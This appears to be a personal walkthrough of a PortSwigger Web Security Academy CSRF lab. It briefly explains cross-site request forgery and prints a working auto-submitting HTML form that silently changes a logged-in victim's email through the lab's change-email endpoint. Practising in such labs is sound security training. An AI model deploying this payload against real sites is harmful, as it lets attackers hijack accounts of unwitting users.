**Quick Brief:**
- CSRF exploits the browser's automatic credential sending mechanism combined with the application's trust in authenticated requests without verification of user intent
- The vulnerability exists because web applications cannot distinguish between:
      1. A legitimate request initiated by the user through the application's UI
      2. A forged request initiated by an attacker from another site


**What we're testing:** The `/my-account/change-email` endpoint for CSRF protection
**Why it might be vulnerable:** No CSRF token, SameSite cookies, or other anti-CSRF measures
**What CSRF exploits:** Browser automatically sends session cookies with requests


**URL:** https://portswigger.net/web-security/csrf/lab-no-defenses
## Steps:
1. Open your lab and log in with given credentials wiener:peter
2. Open Burp Suite we know from the lab describtion the endpoint of the email is vulnerable to csrf
3. Change your email and send the request to repeater
4. Observe from the request there is no protecting parameter like csrf token this is a good sign
5. Now we will prepare our malicious code

6.
 **<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <iframe style="display: none;" id="csrf-iframe"></iframe>
    <form  action="https://0a800000041ec3938006037100650064.web-security-academy.net/my-account/change-email" method="post" id="csrf-form" target="csrf-iframe">
    <input type="hidden" name="email" value="testemail@compa.com">
    </form>
    <script>document.getElementById("csrf-form").submit()</script>
</body>
</html>**


7. Copy this code and paste it in the body of the exploit server and then store the exploit then Deliver exploit to victim
8. Lab solved



